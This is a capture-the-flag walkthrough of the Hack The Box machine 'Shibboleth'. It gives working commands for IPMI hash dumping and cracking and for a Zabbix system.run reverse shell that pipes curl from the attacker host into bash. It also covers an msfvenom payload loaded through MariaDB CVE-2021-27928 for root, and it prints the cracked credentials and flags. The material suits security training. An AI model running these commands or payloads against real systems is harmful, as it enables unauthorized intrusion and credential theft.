# User
## Web
Attempting to visit 10.129.228.103 redirects to http://shibboleth.htb/ so we need to add this to our hosts file in dnsmasq. #dnsmasq
Now we enum for subdomains use #gobuster
```sh
gobuster dns -d shibboleth.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --wildcard
```
And any folders using #dirsearch
```sh
dirsearch -u http://shibboleth.htb
```
Now, so far we haven't found anything useful. So we'll do a UDP nmap scan. Just to be sure this is what we have. While this runs, we'll also run a #nikto scan.
```sh
nikto -url http://shibboleth.htb/    
sudo nmap -sU  shibboleth.htb
```
From this we find IPMI is open
## IPMI 
#ipmi
```sh
sudo apt install ipmitool
ipmitool -I lanplus -H shibboleth.htb -U '' -P '' user list
```
this fails. Let's use hacktricks to help find something else we can maybe do.
## Metasploit
#metasploit
#ipmi-exploit
```sh
use auxiliary/scanner/ipmi/ipmi_dumphashes
set rhosts 10.129.228.103
set OUTPUT_HASHCAT_FILE IPMI_Hash
run
```
This yields
```
Administrator:320b7a6e02020000a29cf531a0d10b55db4d3dbccb9bb547467cf5f75569b69140555d772cff653ba123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:541328d6d5c2d6f15a109c17a27686b574ab20aa
```
Let's cracks it. after deleting the IP and Username from the file.
#hashcat 
```sh
hashcat IPMI_Hash ~/Downloads/rockyou.txt
```
This yields
```
ilovepumkinpie1
```
It was about here after digging into ipmitool that I realized that I fucked up, and my dnsmasq was borked. So I tried stuff again with #ffuf
## Enum
```sh
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://shibboleth.htb -H "Host: FUZZ.shibboleth.htb" -fw 18
```
This yielded
```
monitor                 [Status: 200, Size: 3689, Words: 192, Lines: 30, Duration: 54ms]
monitoring              [Status: 200, Size: 3689, Words: 192, Lines: 30, Duration: 55ms]
zabbix                  [Status: 200, Size: 3689, Words: 192, Lines: 30, Duration: 54ms]
```
## Zabbix Exploitation
So we log into #zabbix and then go to -> settings -> hosts  [Exploit Zabbix for Reverse Shell – Cyber Security Architect | Red/Blue Teaming | Exploit/Malware Analysis (rioasmara.com)](https://rioasmara.com/2022/04/16/exploit-zabbix-for-reverse-shell/)
- Next we select "New Item" (Top right)
- Then by the "key" filter we click on "select"
	- Here we find "system.run" (hell yes)
#reverse-shell-python3-http_server
```sh
#execute on your own host.
mkdir rev_shell
cd rev_shell
echo '/bin/bash -c "bash -i >& /dev/tcp/10.10.14.5/8008 0>&1"' >the_shell 
python3 -m http.server -p 80
```
Have the settings for the server look like this. 
```sh
system.run[curl --http0.9 10.10.14.5/the_shell|bash,no_wait]
```

SPEC CURL 0.9
![[Pasted image 20240522121814.png]]
Then click "test" -> get value and test.
```sh
#this is in your nc terminal
su ipmi-svc #we only have one password, enter that.
ilovepumkinpie1
cat \home\ipmi-svc\user.txt
```
0c4c0fb46dc969db297bf9497412f3d7
# Root

First let's make a non-shit terminal
```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
## Enum
```sh
systemctl -a #reveals mysql as a process. Neat
ss -tnlp
cd /etc/zabbix/
cat zabbix.conf | grep -v "#"
```
#zabbix-config-creds can be found then here
#mysql-creds
```
DBUser=zabbix
DBPassword=bloooarskybluh
```
## MySQL
#mysql
```sh
mysql -u zabbix -p #then enter in the password.
```

```mysql
show databases;
use zabbix
show tables;
select * from users;
```
yields for administrator:
```
$2y$10$L9tjKByfruByB.BaTQJz/epcbDQta4uRM/KySxSZTwZkMGuKTPPT2
$2y$10$FhkN5OCLQjs3d6C.KtQgdeCc485jKBWPW4igFVEgtIP3jneaN7GQe
```
Let's crack em'
#hashcat
```
hashcat mysql_adminHashes ~/Downloads/rockyou.txt -m 3200
```
7 days seems unreasonable. So let's find an exploit
# Maria
#mariadb-exploit #10-3-25-MariaDB-0
[shamo0/CVE-2021-27928-POC: CVE-2021-27928-POC (github.com)](https://github.com/shamo0/CVE-2021-27928-POC)
So we find a version for mariaDB because of the version we found when we logged in.

```sh
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=800 -f elf-so -o MariaDBExploit2.so
python3 -m http.server
```
Back on our target
```sh
exit
cd /tmp
wget http://10.10.14.5:8000/MariaDBExploit2.so
```
Back on our host.
```
ctrl+c
nc -nlvp 800
```
Back on our target.
```sh
mariadb -u zabbix -p
bloooarskybluh
```
```mysql
SET GLOBAL wsrep_provider="/tmp/MariaDBExploit2.so";
```
now it should've worked.
```
cat /root/root.txt
```
0b197764bf0d6e38c6e3f65055823267


